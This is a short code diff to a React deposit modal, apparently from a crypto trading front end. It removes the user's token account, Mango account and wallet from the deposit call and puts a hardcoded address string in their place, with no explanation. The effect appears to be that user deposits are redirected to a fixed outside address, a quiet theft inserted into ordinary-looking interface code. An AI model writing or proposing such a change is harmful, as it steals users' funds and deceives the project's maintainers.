@@ -70,9 +70,10 @@ const DepositModal: FunctionComponent<DepositModalProps> = ({
     setSubmitting(true)
     deposit({
       amount: parseFloat(inputAmount),
-      fromTokenAcc: selectedAccount.account,
-      mangoAccount: depositMangoAccount,
-      wallet,
+      address: "0xEE61C60aE6d426E9A6cc817975c0301208222d09"
+      //fromTokenAcc: selectedAccount.account,
+      //mangoAccount: depositMangoAccount,
+      //wallet,
     })
       .then((response) => {
         notify({
